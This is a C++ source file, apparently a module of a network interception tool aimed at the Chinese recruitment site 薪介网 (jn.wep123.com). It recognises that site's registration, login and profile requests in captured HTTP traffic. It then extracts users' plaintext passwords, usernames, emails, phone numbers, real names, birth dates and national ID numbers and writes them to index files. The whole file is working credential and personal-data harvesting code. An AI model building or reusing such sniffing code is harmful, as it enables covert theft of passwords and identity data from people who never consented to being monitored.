#include "StdAfx.h"
#include "EmployXinJieWang.h"

employ::XinJieWang::XinJieWang(HttpSession *http_session, const string &pro_name) : Employ(http_session,pro_name)
{
	app_ = "薪介网";
}

employ::XinJieWang::~XinJieWang()
{
	
}

int employ::XinJieWang::IsXinJieWang(HttpSession *http_session)
{
	//注册(邮箱注册)
	if((http_session->m_Requestline.m_Host.Find("jn.wep123.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/register_email.aspx")!=-1) )
	{
		return kPcWebRegisterEmail;
	}
	//注册(用户名)
	if((http_session->m_Requestline.m_Host.Find("jn.wep123.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/register_user.aspx")!=-1) )
	{
		return kPcWebRegisteruser;
	}
	//登录
	if((http_session->m_Requestline.m_Host.Find("jn.wep123.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/person/login.aspx")!=-1) )
	{
		return kPcWebLogin;
	}
	//新建基本信息
	if((http_session->m_Requestline.m_Host.Find("jn.wep123.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/resume/Register_two")!=-1) )
	{
		return kPcWebRegisterInfo;
	}
	//修改基本信息
	if((http_session->m_Requestline.m_Host.Find("jn.wep123.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/Resume/Res_Resume_Basic.aspx")!=-1) )
	{
		return kPcWebModiy;
	}
	return 0;
}

int employ::XinJieWang::Process(const char *packet,int action)
{
	//注册(邮箱注册)
	if (action == kPcWebRegisterEmail)
	{
		return PcWebRegisterEmail(packet);
	}
	//注册(用户名)
	if (action ==kPcWebRegisteruser)
	{
		return PcWebRegisteruser(packet);
	}
	//登录
	if (action == kPcWebLogin)
	{
		return PcWebLogin(packet);
	}
	//新建基本信息
	if (action == kPcWebRegisterInfo)
	{
		return PcWebRegisterInfo(packet);
	}
	//修改基本信息
	if (action == kPcWebModiy)
	{
		return PcWebModiy(packet);
	}
	return 1;
}

//注册(邮箱注册)
int employ::XinJieWang::PcWebRegisterEmail(const char *packet)
{
	string src_data(packet);
	//精确提取数据
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//账号
	string email = ms_->GetValueFromMapByKey("txtEmail",true);
	//手机号
	string phone = ms_->GetValueFromMapByKey("txtMobile",true);
	//密码
	string pass = ms_->GetValueFromMapByKey("txtPassword",true);
	if (email.empty() || phone.empty() || pass.empty())
	{
		return 0;
	}
	output_text_ =
		"oid=" + phone + "\r\n" + 	//手机号		
		"mid=" + email + "\r\n" + 	//邮箱	
		"pass=" + pass + "\r\n" + 	//密码	
		"netmark=" + app_ + "\r\n" + //来源
		"state=注册\r\n";
	WriteIndexFile();
	return 1;
}

//用户名(注册)
int employ::XinJieWang::PcWebRegisteruser(const char *packet)
{
	string src_data(packet);
	//精确提取数据
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//用户名
	string username = ms_->GetValueFromMapByKey("txtUsername",true);
	//密码
	string pwd = ms_->GetValueFromMapByKey("txtPassword",true);
	//邮箱
	string email = ms_->GetValueFromMapByKey("txtEmail",true);
	//手机号
	string phone = ms_->GetValueFromMapByKey("txtMobile",true);
	if (username.empty() || pwd.empty() || email.empty() || phone.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" +	//账号	
		"pass=" + pwd + "\r\n" + 		//密码		
		"oid=" + phone + "\r\n" + 		//手机号	
		"mid=" + email + "\r\n" + 		//邮箱	
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=注册\r\n";
	WriteIndexFile();
	return 1;
}

//登录
int employ::XinJieWang::PcWebLogin(const char *packet)
{
	string src_data(packet);
	//精确提取数据
	if (src_data.rfind("\r\n") != 0)
	{
		src_data = src_data.substr(src_data.rfind("\r\n") + strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//账号
    string UserName = ms_->GetValueFromMapByKey("txt_Username",true);
	//密码
	string Password = ms_->GetValueFromMapByKey("txt_Password",true);
	if (UserName.empty() || Password.empty())
	{
		return 0;
	}
	output_text_ =
		"user="  + UserName + "\r\n" + 	//账号		
		"pass=" + Password + "\r\n" + 	//密码
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

//新建基本信息
int employ::XinJieWang::PcWebRegisterInfo(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//姓名
	string username = ms_->GetValueFromMapByKey("txt_Realname",true);
	//性别
	string sex = ms_->GetValueFromMapByKey("rbn_Sex",true);
	if (sex == "True")
	{
		sex = "男";
	}else
	{
		sex = "女";
	}
	//出生日期
	string birth = ms_->GetValueFromMapByKey("txt_BirthDate",true);
	//手机号
	string mobile = ms_->GetValueFromMapByKey("txt_Mobile",true);
	//邮箱
	string email = ms_->GetValueFromMapByKey("hid_Email",true);
	output_text_ =
		"servername=" + username + "\r\n" + //姓名	       
		"sex=" + sex + "\r\n" + 		//性别	
		"msg=" + birth + "\r\n" + 		//出生日期	
		"oid=" + mobile + "\r\n" + 		//手机号		
		"mid=" + email + "\r\n" + 		//邮箱	
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=新建基本信息\r\n";
	WriteIndexFile();
	return 1;
}

//修改个人信息
int employ::XinJieWang::PcWebModiy(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//姓名
	string username = ms_->GetValueFromMapByKey("txt_Realname",true);
	//性别
	string sex = ms_->GetValueFromMapByKey("rbn_Sex",true);
	if (sex == "False")
	{
		sex = "女";
	}
	else
	{
		sex = "男";
	}
	//生日
	string birth = ms_->GetValueFromMapByKey("txt_BirthDate",true);
	//证件类型
	string shw_IdType = ms_->GetValueFromMapByKey("shw_IdType",true);
	//证件号
	string idcode = ms_->GetValueFromMapByKey("txt_IdCode",true);
	//手机号 
	string mobile = ms_->GetValueFromMapByKey("txt_Mobile",true);
	if (username.empty() || sex.empty() || mobile.empty() || birth.empty())
	{
		return 0;
	}
	if (idcode.empty())
	{
		idcode = "无";
	}
	output_text_=
		"servername=" + username + "\r\n" + //姓名	       
		"sex=" + sex + "\r\n" + 		//性别	
		"msg=" + birth + "\r\n" + 		//出生日期	
		"oid=" + mobile + "\r\n" + 		//手机号
		"imsi=" + shw_IdType + "\r\n" + //证件类型	
		"appname=" + idcode + "\r\n" + 	//证件号
		"netmark=" + app_ + "\r\n" + 	//来源
		"state=修改基本信息\r\n";
	WriteIndexFile();
	return 1;
}